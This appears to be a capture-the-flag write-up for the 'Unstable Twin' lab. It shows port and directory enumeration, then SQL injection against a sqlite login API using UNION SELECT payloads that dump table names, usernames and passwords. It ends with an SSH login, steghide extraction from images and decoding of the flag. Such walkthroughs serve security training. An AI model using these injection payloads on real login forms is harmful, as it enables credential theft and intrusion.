## Unstable Twin

# Enumeration
```
# Nmap 7.91 scan initiated Sat May  1 12:39:14 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80 10.10.75.126
Nmap scan report for 10.10.75.126
Host is up, received admin-prohibited ttl 61 (0.15s latency).
Scanned at 2021-05-01 12:39:15 PDT for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 ba:a2:40:8e:de:c3:7b:c7:f7:b3:7e:0c:1e:ec:9f:b8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP/bNr/nN/6PCa1yFPjA11XH0aZeVg2OMFGyxF3iCBim97a/vA33LYCnDGh7jjSP+wEzu2Xh6whOuRU147tRglKgXMVqMx7GIfBKp92pPnePbCQi6Qy9Sp1hJCIK9Ik2qzYbVOHr6vSJVRGKdZuCDrqip67tHPJSqtDKvuTS8PTcWav17y0IhBrcU2KoGptwml4I/j3RO/aVYblAEKMH0tn9vy59tokTm0CoPXjZCH7KJfL87YAdyacAA6FB2DIFEupf56qGoGNUP9v7AMaF6Uj/5ywDduik/YOdvBR7AVlX2IOaAu4yLRWIh9S4XvlzCB3N+UyQmXRKSzcSyhKXIRJYidCs0SwhCTF+umbmtMAfHghLBz4pkLbhbqrVqkf0GA8wKyG9rX6LSUl6/SwhtAeFPIQxnnP6OHxrcKHy4BooCVNpur5fkioel5VHO90cK0xzlPWGJ8P4HOnDRmLWpyBAmmPjY8BHNB4rLccZLz1e648h7Zs9sFvhjJD8ONgW0=
|   256 38:28:4c:e1:4a:75:3d:0d:e7:e4:85:64:38:2a:8e:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH7P2OEvegGP6MfdwJdgVn3xIYEH6LXyzBs5hQ5fPpMZDZdHo5a6J2HR+KShaslzYk83WGNBSJt+hQUGv0Kr+Hs=
|   256 1a:33:a0:ed:83:ba:09:a5:62:a7:df:ab:2f:ee:d0:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN0pHtBDjHWNJSlxl5M/LfHJztN6HJzi30Ygi1ysEOJN
80/tcp open  http    syn-ack ttl 61 nginx 1.14.1
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  1 12:39:28 2021 -- 1 IP address (1 host up) scanned in 13.69 seconds
```

Seems like just ssh and a web server are open. Visiting the web server presents us a blank page so we go ahead and use gobuster 
```
# gobuster dir -t 64 -u http://10.10.75.126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster/initial
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.75.126
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/05/01 12:55:46 Starting gobuster in directory enumeration mode
===============================================================
/api 				  (Status: 404) [Size: 0]
/info                 (Status: 200) [Size: 148]
/get_image            (Status: 500) [Size: 291]
```

```
# curl -i http://10.10.75.126/info
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Sat, 01 May 2021 21:25:13 GMT
Content-Type: application/json
Content-Length: 160
Connection: keep-alive
Build Number: 1.3.4-dev
Server Name: Vincent

"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"

# curl -i http://10.10.75.126/info
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Sat, 01 May 2021 21:25:43 GMT
Content-Type: application/json
Content-Length: 148
Connection: keep-alive
Build Number: 1.3.6-final
Server Name: Julias

"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
```

By using curl with the -i flag we can get header information and find the build number of the server as well as confirm that there are multiple builds by executing the command multiple times.
We also get some information that there is a login api that requires a username and password field. so lets try and use the /api and more specifically /api/login to see if there is a response before we fuzz for what the api endpoint is called.

```
┌──(root💀kali)-[~]
└─# curl -X POST http://10.10.75.126/api/login
"The username or password passed are not correct."

┌──(root💀kali)-[~]
└─# curl -X POST http://10.10.75.126/api/login -d 'username=admin&password=admin'
"The username or password passed are not correct."
```
We were correct to assume that the endpoint would be login unfortunately default credential don't work so lets test for sqli vulnerabilies by adding a '
```
# curl -X POST http://10.10.75.126/api/login -d "username=admin' &password=admin"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```
So now we can start to gather some information and find we are using sqlite. So let use the following payload to get table information
```
# curl -X POST http://10.10.75.126/api/login -d "username=admin' UNION SELECT 1,tbl_name from sqlite_master -- - &password=admin"
[
  [
    1,
    "notes"
  ],
  [
    1,
    "sqlite_sequence"
  ],
  [
    1,
    "users"
  ]
]
```
I'm using some intuition here for the columns that we are trying to grab data from, but.
Looks like a user table exists so let's try and grab username and passwords with the following

```
# curl -X POST http://10.10.75.126/api/login -d "username=admin' UNION SELECT username, password FROM users-- - &password=admin"
[
  [
    "julias",
    "Red"
  ],
  [
    "linda",
    "Green"
  ],
  [
    "marnie",
    "Yellow "
  ],
  [
    "mary_ann",
    "continue..."
  ],
  [
    "vincent",
    "Orange"
  ]
]
```
Excellent we found all the user information we were looking for however next we need to find Mary's SSH password so lets check out the notes table we haven't looked at
```
# curl -X POST http://10.10.75.126/api/login -d "username=admin' UNION SELECT 1, notes FROM notes-- - &password=admin"/
[
  [
    1,
    "I have left my notes on the server.  They will me help get the family back together. "
  ],
  [
    1,
    "My Password is redacted\n"
  ]
]
```
This seems promising we can go ahead and crack the hashed password using crackstation and now lets move on to connecting through SSH

# Initial Foothold
```
# ssh mary_ann@10.10.75.126                                                                                    255 ⨯
mary_ann@10.10.75.126's password:
Last login: Sun Feb 14 09:56:18 2021 from 192.168.20.38
Hello Mary Ann
[mary_ann@UnstableTwin ~]$ ls -la
total 24
drwx------. 3 mary_ann mary_ann 138 Feb 13 10:18 .
drwxr-xr-x. 3 root     root      22 Feb 13 09:31 ..
-rw-------. 1 mary_ann mary_ann 115 Feb 13 10:24 .bash_history
-rw-r--r--. 1 mary_ann mary_ann  18 Jul 21  2020 .bash_logout
-rw-r--r--. 1 mary_ann mary_ann 141 Jul 21  2020 .bash_profile
-rw-r--r--. 1 mary_ann mary_ann 424 Feb 13 10:18 .bashrc
drwx------. 2 mary_ann mary_ann  44 Feb 13 09:51 .gnupg
-rw-r--r--. 1 mary_ann mary_ann 219 Feb 13 10:13 server_notes.txt
-rw-r--r--. 1 mary_ann mary_ann  20 Feb 13 10:15 user.flag
```
We find the user flag here and the following note
```
[mary_ann@UnstableTwin ~]$ cat server_notes.txt
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```
Looks like we need to aquire some images of the "family" so based on the hint we can probably utilize the get_image endpoint we found earlier with a name parameter to get individual images
We can use the following format and repeat it for each user to get all the images we need
```
# curl http://10.10.75.126/get_image?name=julias --output julias.jpg
```
Looking at the images and metadata we can't find anything else out so let's see if there is some stegonography going on
```
# steghide extract -sf marnie.jpg
Enter passphrase:
wrote extracted data to "marine.txt".
```
Looks like we can extract a txt file from each image with the above format and no passphrase
```
Red - REDACTED STRING
Green - REDACTED STRING
Yellow - REDACTED STRING
You need to find all my children and arrange in a rainbow!
Orange - REDACTED STRING
```
Feels like I'm back in elementary school, ROYGBIV! So let combine the fragmented strings in rainbow order and see if we can decipher the final string. We can use cyberchef and try converting from different formats to ultimately find that it is a base62 string and we recieve our final flag
